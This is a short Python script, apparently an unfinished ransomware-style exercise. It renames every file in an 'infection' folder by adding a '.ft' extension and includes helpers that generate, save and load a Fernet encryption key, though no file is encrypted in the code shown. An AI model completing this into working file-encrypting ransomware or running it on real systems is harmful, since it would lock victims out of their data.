import os
from cryptography.fernet import Fernet

def main():

    folder = "infection"
    for count, filename in enumerate(os.listdir(folder)):
        rename = filename + '.ft'
        src = folder + '/' + filename
        dst = folder + '/' + rename
        print(filename, src)
        if not filename.endswith('.ft'):
            os.rename(src, dst)

def write_key():

    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():

    return open("key.key", "rb").read()

if __name__ == '__main__':
    main()
